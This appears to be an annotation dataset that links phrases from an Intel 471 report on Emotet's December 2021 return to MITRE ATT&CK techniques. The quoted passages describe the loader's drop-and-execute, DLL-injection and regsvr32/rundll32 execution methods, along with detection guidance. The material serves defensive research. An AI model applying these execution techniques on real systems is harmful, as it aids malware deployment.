{"mention": "executes", "context_left": "| | 3 | Execute EXE | Drops and", "context_right": "executable. |", "_context_left": "| 3 | Execute EXE | Drops and ", "_context_right": " executable.", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Drops and executes executable", "context_left": "| | 3 | Execute EXE |", "context_right": ". |", "_context_left": "| 3 | Execute EXE | ", "_context_right": ".", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "executes", "context_left": "| | 4 | Execute EXE as user | Drops and", "context_right": "executable as a specific user. |", "_context_left": "| 4 | Execute EXE as user | Drops and ", "_context_right": " executable as a specific user.", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Drops and executes executable as a specific user.", "context_left": "| | 4 | Execute EXE as user |", "context_right": "|", "_context_left": "| 4 | Execute EXE as user | ", "_context_right": "", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "executes", "context_left": "| | 5 | Inject DLL with export | Injects a DLL into memory and maps and", "context_right": "the export DllRegisterServer. |", "_context_left": "| 5 | Inject DLL with export | Injects a DLL into memory and maps and ", "_context_right": " the export DllRegisterServer.", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Inject DLL with export", "context_left": "| | 5 |", "context_right": "| Injects a DLL into memory and maps and executes the export DllRegisterServer. |", "_context_left": "| 5 | ", "_context_right": " | Injects a DLL into memory and maps and executes the export DllRegisterServer.", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Injects a DLL into memory and", "context_left": "| | 5 | Inject DLL with export |", "context_right": "maps and executes the export DllRegisterServer. |", "_context_left": "| 5 | Inject DLL with export | ", "_context_right": " maps and executes the export DllRegisterServer.", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "executes", "context_left": "| | 6 | Execute dll with `regsvr32[.]exe` | Drops and", "context_right": "DLL with `“regsvr32[.]exe -s .”` |", "_context_left": "| 6 | Execute dll with `regsvr32[.]exe` | Drops and ", "_context_right": " DLL with `“regsvr32[.]exe -s .”`", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Execute dll with `regsvr32[.]exe`", "context_left": "| | 6 |", "context_right": "| Drops and executes DLL with `“regsvr32[.]exe -s .”` |", "_context_left": "| 6 | ", "_context_right": " | Drops and executes DLL with `“regsvr32[.]exe -s .”`", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Drops and executes DLL with `“regsvr32[.]exe -s", "context_left": "| | 6 | Execute dll with `regsvr32[.]exe` |", "context_right": ".”` |", "_context_left": "| 6 | Execute dll with `regsvr32[.]exe` | ", "_context_right": " .”`", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "executes", "context_left": "| | 7 | Execute dll with `rundll32[.]exe` | Drops and", "context_right": "DLL with `“rundll32[.]exe , Control\\_RunDLL.”` |", "_context_left": "| 7 | Execute dll with `rundll32[.]exe` | Drops and ", "_context_right": " DLL with `“rundll32[.]exe , Control\\_RunDLL.”`", "sentence_left": "|", "sentence_right": "|", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Execute dll with `rundll32[.]exe`", "context_left": "| | 7 |", "context_right": "| Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.”` |", "_context_left": "| 7 | ", "_context_right": " | Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.”`", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.", "context_left": "| | 7 | Execute dll with `rundll32[.]exe` |", "context_right": "”` |", "_context_left": "| 7 | Execute dll with `rundll32[.]exe` | ", "_context_right": "”`", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "| The update to the loader’s command table gives", "context_right": "much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family. In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "_context_left": "The update to the loader’s command table gives ", "_context_right": " much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.", "sentence_left": "|", "sentence_right": "In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "| The update to the loader’s command table gives Emotet much more customizable execution options, allowing", "context_right": "to better function as a loader-focused distribution family. In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "_context_left": "The update to the loader’s command table gives Emotet much more customizable execution options, allowing ", "_context_right": " to better function as a loader-focused distribution family.", "sentence_left": "|", "sentence_right": "In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The update to the loader’s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family. In the course of investigating the code, Intel 471 found two new distinct", "context_right": "botnets. We are categorizing them as:", "_context_left": "In the course of investigating the code, Intel 471 found two new distinct ", "_context_right": " botnets.", "sentence_left": "The update to the loader’s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.", "sentence_right": "We are categorizing them as:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "* Epoch5 Additionally, prior to", "context_right": "’s takedown, it had the following distinct botnets: * Epoch1", "_context_left": "Additionally, prior to ", "_context_right": "’s takedown, it had the following distinct botnets:", "sentence_left": "* Epoch5", "sentence_right": "* Epoch1", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**What we suggest for remediation** As", "context_right": "is a multistage infection, there are many opportunities for defenders to catch it during operation. During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.", "_context_left": "As ", "_context_right": " is a multistage infection, there are many opportunities for defenders to catch it during operation.", "sentence_left": "**What we suggest for remediation**", "sentence_right": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation. During the email/maldoc stage, one such method for detection is user awareness regarding the lure template", "context_right": "uses. The red box template in Image 2 is standard for Emotet documents.", "_context_left": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template ", "_context_right": " uses.", "sentence_left": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.", "sentence_right": "The red box template in Image 2 is standard for Emotet documents.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "email/maldoc", "context_left": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation. During the", "context_right": "stage, one such method for detection is user awareness regarding the lure template Emotet uses. The red box template in Image 2 is standard for Emotet documents.", "_context_left": "During the ", "_context_right": " stage, one such method for detection is user awareness regarding the lure template Emotet uses.", "sentence_left": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.", "sentence_right": "The red box template in Image 2 is standard for Emotet documents.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses. The red box template in Image 2 is standard for", "context_right": "documents. If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "_context_left": "The red box template in Image 2 is standard for ", "_context_right": " documents.", "sentence_left": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.", "sentence_right": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "red box template in Image 2 is standard for Emotet documents.", "context_left": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses. The", "context_right": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "_context_left": "The ", "_context_right": "", "sentence_left": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.", "sentence_right": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Microsoft", "context_left": "The red box template in Image 2 is standard for Emotet documents. If that fails, defenders can look for instances where PowerShell is spawned from", "context_right": "Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL. While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "_context_left": "If that fails, defenders can look for instances where PowerShell is spawned from ", "_context_right": " Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "sentence_left": "The red box template in Image 2 is standard for Emotet documents.", "sentence_right": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "PowerShell", "context_left": "The red box template in Image 2 is standard for Emotet documents. If that fails, defenders can look for instances where", "context_right": "is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL. While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "_context_left": "If that fails, defenders can look for instances where ", "_context_right": " is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "sentence_left": "The red box template in Image 2 is standard for Emotet documents.", "sentence_right": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "spawned from Microsoft Word or Excel sheets", "context_left": "The red box template in Image 2 is standard for Emotet documents. If that fails, defenders can look for instances where PowerShell is", "context_right": "and subsequently opens `rundll32[.]exe` to execute a DLL. While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "_context_left": "If that fails, defenders can look for instances where PowerShell is ", "_context_right": " and subsequently opens `rundll32[.]exe` to execute a DLL.", "sentence_left": "The red box template in Image 2 is standard for Emotet documents.", "sentence_right": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "rundll32[.]exe` to execute a DLL.", "context_left": "The red box template in Image 2 is standard for Emotet documents. If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `", "context_right": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "_context_left": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `", "_context_right": "", "sentence_left": "The red box template in Image 2 is standard for Emotet documents.", "sentence_right": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL. While", "context_right": "typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings. As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "_context_left": "While ", "_context_right": " typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "sentence_left": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "sentence_right": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings. As", "context_right": "creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`. Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries.", "_context_left": "As ", "_context_right": " creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "sentence_left": "While Emotet typically uses the export “Control\\\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "sentence_right": "Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`. Additionally, during various command executions, defenders can look for the following command lines to detect", "context_right": "when it executes binaries. However, Emotet will have installed at this point and a full investigation will be needed:", "_context_left": "Additionally, during various command executions, defenders can look for the following command lines to detect ", "_context_right": " when it executes binaries.", "sentence_left": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "sentence_right": "However, Emotet will have installed at this point and a full investigation will be needed:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": 